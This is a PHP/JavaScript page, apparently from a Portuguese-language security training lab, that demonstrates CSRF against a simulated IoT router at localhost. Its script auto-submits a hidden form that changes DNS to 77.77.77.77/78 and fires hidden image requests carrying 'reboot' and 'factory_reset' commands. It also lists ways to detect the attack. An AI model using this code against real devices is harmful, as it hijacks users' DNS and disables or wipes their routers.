<?php
defined('APP') or die('Access denied');
?>

<div class="container mt-4">
    <div class="row">
        <div class="col-12">
            <div class="card border-warning">
                <div class="card-header bg-warning text-dark">
                    <h5 class="card-title mb-0">
                        <i class="fas fa-shield-alt"></i>
                        🎯 CSRF Realista (Sem CORS Permissivo)
                    </h5>
                </div>
                <div class="card-body">
                    <div class="alert alert-info" role="alert">
                        <h6 class="alert-heading">✅ Cenário Realista</h6>
                        <p class="mb-0">Esta demonstração mostra como ataques CSRF funcionam na <strong>realidade</strong>,
                        sem depender de headers CORS permissivos. Dispositivos IoT reais raramente têm CORS configurado corretamente.</p>
                    </div>

                    <div class="row">
                        <div class="col-md-6">
                            <div class="card">
                                <div class="card-header">
                                    <h6>🎯 Diferenças do Cenário Realista</h6>
                                </div>
                                <div class="card-body">
                                    <ul class="small">
                                        <li><strong>❌ Sem headers CORS permissivos</strong></li>
                                        <li><strong>✅ Usa formulários tradicionais</strong></li>
                                        <li><strong>✅ Imagens para requisições GET</strong></li>
                                        <li><strong>✅ Não depende de JavaScript fetch</strong></li>
                                        <li><strong>✅ Funciona como ataque real</strong></li>
                                    </ul>
                                </div>
                            </div>

                            <div class="card mt-3">
                                <div class="card-header">
                                    <h6>🔧 Controles do Ataque</h6>
                                </div>
                                <div class="card-body">
                                    <button id="startRealisticAttack" class="btn btn-danger btn-sm mb-2">
                                        🚀 Ataque CSRF Realista
                                    </button>
                                    <button id="clearRealisticLogs" class="btn btn-secondary btn-sm mb-2">
                                        🧹 Limpar Logs
                                    </button>
                                    <br>
                                    <small class="text-muted">
                                        Este ataque funciona sem CORS permissivo!
                                    </small>
                                </div>
                            </div>
                        </div>

                        <div class="col-md-6">
                            <div class="card">
                                <div class="card-header">
                                    <h6>📊 Status do Ataque</h6>
                                </div>
                                <div class="card-body">
                                    <div id="realisticAttackStatus">
                                        <p class="text-muted">Aguardando início do ataque...</p>
                                    </div>
                                    <div id="realisticCompromiseStatus" style="display: none;">
                                        <div class="alert alert-danger">
                                            <h6>🚨 CSRF BEM-SUCEDIDO!</h6>
                                            <p class="mb-1"><strong>Alvo:</strong> <span id="realisticTarget"></span></p>
                                            <p class="mb-0"><small>Ataque executado sem CORS permissivo</small></p>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="card mt-3">
                                <div class="card-header">
                                    <h6>🔍 Como Detectar</h6>
                                </div>
                                <div class="card-body">
                                    <ul class="small">
                                        <li>Headers Origin/Referer suspeitos</li>
                                        <li>Requisições sem sessão válida</li>
                                        <li>Padrões de tráfego anômalos</li>
                                        <li>Logs de segurança detalhados</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Comparison Table -->
                    <div class="row mt-4">
                        <div class="col-12">
                            <div class="card">
                                <div class="card-header">
                                    <h6>📋 Comparação: Demo vs Realidade</h6>
                                </div>
                                <div class="card-body">
                                    <table class="table table-sm">
                                        <thead>
                                            <tr>
                                                <th>Aspecto</th>
                                                <th>Demo Anterior (Com CORS)</th>
                                                <th>Realidade (Sem CORS)</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td><strong>Headers CORS</strong></td>
                                                <td>❌ Permissivos <code>Access-Control-Allow-Origin: *</code></td>
                                                <td>✅ Ausentes ou restritivos</td>
                                            </tr>
                                            <tr>
                                                <td><strong>Método de Ataque</strong></td>
                                                <td>❌ fetch() com no-cors</td>
                                                <td>✅ Formulários e imagens</td>
                                            </tr>
                                            <tr>
                                                <td><strong>Leitura de Resposta</strong></td>
                                                <td>❌ Via API separada</td>
                                                <td>✅ Não necessária</td>
                                            </tr>
                                            <tr>
                                                <td><strong>Realismo</strong></td>
                                                <td>❌ Baixo (má configuração)</td>
                                                <td>✅ Alto (cenário real)</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Log Area -->
                    <div class="row mt-4">
                        <div class="col-12">
                            <div class="card">
                                <div class="card-header">
                                    <h6>📜 Log de Atividades Realista</h6>
                                </div>
                                <div class="card-body">
                                    <div id="realisticLogArea" style="height: 300px; overflow-y: auto; background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 12px;">
                                        <div class="text-muted">Logs de ataque realista aparecerão aqui...</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const startButton = document.getElementById('startRealisticAttack');
    const clearButton = document.getElementById('clearRealisticLogs');
    const statusArea = document.getElementById('realisticAttackStatus');
    const logArea = document.getElementById('realisticLogArea');

    let attackInProgress = false;

    // Função para adicionar logs
    function addLog(message, type = 'info') {
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry log-${type}`;
        logEntry.innerHTML = `<strong>[${timestamp}]</strong> ${message}`;

        logArea.appendChild(logEntry);
        logArea.scrollTop = logArea.scrollHeight;

        console.log(`[CSRF Realista] ${message}`);
    }

    // Função para atualizar status
    function updateStatus(message, type = 'info') {
        let badgeClass = 'badge-secondary';
        switch(type) {
            case 'success': badgeClass = 'badge-success'; break;
            case 'error': badgeClass = 'badge-danger'; break;
            case 'warning': badgeClass = 'badge-warning'; break;
            case 'progress': badgeClass = 'badge-primary'; break;
        }

        statusArea.innerHTML = `<span class="badge ${badgeClass}">${message}</span>`;
    }

    // Função para executar ataque CSRF realista
    async function performRealisticCsrfAttack() {
        const target = 'localhost:8181';

        try {
            addLog('🎯 Iniciando ataque CSRF realista...', 'info');
            addLog('✅ Sem dependência de headers CORS permissivos', 'info');
            updateStatus('Executando CSRF tradicional...', 'progress');

            // 1. Ataque DNS via formulário tradicional (não bloqueado por CORS)
            addLog('📝 Criando formulário CSRF para alteração de DNS...', 'info');

            const csrfForm = document.createElement('form');
            csrfForm.method = 'POST';
            csrfForm.action = `http://${target}/admin_realistic.php`;
            csrfForm.style.display = 'none';

            // Adiciona campos maliciosos
            const primaryDnsField = document.createElement('input');
            primaryDnsField.type = 'hidden';
            primaryDnsField.name = 'primary_dns';
            primaryDnsField.value = '77.77.77.77';

            const secondaryDnsField = document.createElement('input');
            secondaryDnsField.type = 'hidden';
            secondaryDnsField.name = 'secondary_dns';
            secondaryDnsField.value = '77.77.77.78';

            csrfForm.appendChild(primaryDnsField);
            csrfForm.appendChild(secondaryDnsField);

            document.body.appendChild(csrfForm);

            addLog('🚀 Submetendo formulário CSRF (DNS: 77.77.77.77/78)...', 'warning');
            csrfForm.submit();

            await sleep(2000);

            document.body.removeChild(csrfForm);

            addLog('✅ Formulário CSRF enviado com sucesso!', 'success');
            addLog('📡 DNS alterado para: 77.77.77.77 / 77.77.77.78', 'success');

            // 2. Comandos via GET usando imagens (técnica clássica)
            addLog('🖼️ Executando comandos via imagens (GET requests)...', 'warning');

            const commands = ['reboot', 'factory_reset'];

            for (let cmd of commands) {
                addLog(`⚡ Comando via imagem: ${cmd}`, 'warning');

                const img = document.createElement('img');
                img.src = `http://${target}/admin_realistic.php?cmd=${cmd}`;
                img.style.display = 'none';
                img.style.width = '1px';
                img.style.height = '1px';

                // Não importa se carrega ou falha - comando foi enviado
                img.onload = () => addLog(`✅ Imagem carregada: ${cmd}`, 'info');
                img.onerror = () => addLog(`📡 Comando enviado via imagem: ${cmd}`, 'info');

                document.body.appendChild(img);

                await sleep(1000);
            }

            addLog('🏁 Ataque CSRF realista concluído!', 'success');
            addLog('🎯 Dispositivo comprometido via formulários tradicionais', 'success');
            addLog('⚠️ Nenhum header CORS permissivo foi necessário!', 'info');

            updateStatus('Ataque CSRF realista bem-sucedido!', 'error');

            // Mostra status de comprometimento
            document.getElementById('realisticCompromiseStatus').style.display = 'block';
            document.getElementById('realisticTarget').textContent = `http://${target}/admin_realistic.php`;

            addLog('🔍 Verifique: http://localhost:8181/admin_realistic.php', 'info');

        } catch (error) {
            addLog(`💥 Erro no ataque: ${error.message}`, 'error');
            updateStatus('Ataque falhou', 'error');
        }
    }

    // Função helper para aguardar
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Event listeners
    startButton.addEventListener('click', async function() {
        if (attackInProgress) {
            return;
        }

        attackInProgress = true;
        startButton.disabled = true;
        startButton.textContent = '⏳ Atacando...';

        logArea.innerHTML = '';

        addLog('🚨 INÍCIO DO ATAQUE CSRF REALISTA', 'error');
        addLog('✅ Sem headers CORS permissivos necessários', 'info');
        addLog('📝 Usando formulários e imagens tradicionais', 'info');

        await performRealisticCsrfAttack();

        attackInProgress = false;
        startButton.disabled = false;
        startButton.textContent = '🚀 Ataque CSRF Realista';
    });

    clearButton.addEventListener('click', function() {
        logArea.innerHTML = '<div class="text-muted">Logs limpos...</div>';
        updateStatus('Aguardando...', 'info');
        document.getElementById('realisticCompromiseStatus').style.display = 'none';
        console.clear();
    });

    // Log inicial
    addLog('💻 Demo de CSRF realista carregada', 'info');
    addLog('🛡️ Simulando dispositivo IoT sem CORS permissivo', 'info');
    addLog('✅ Ataque funciona com formulários tradicionais', 'info');

    console.log('🔥 CSRF Realistic Demo Loaded');
    console.log('✅ Esta demonstração é mais realista que a anterior');
    console.log('📚 Não depende de má configuração de CORS');
});
</script>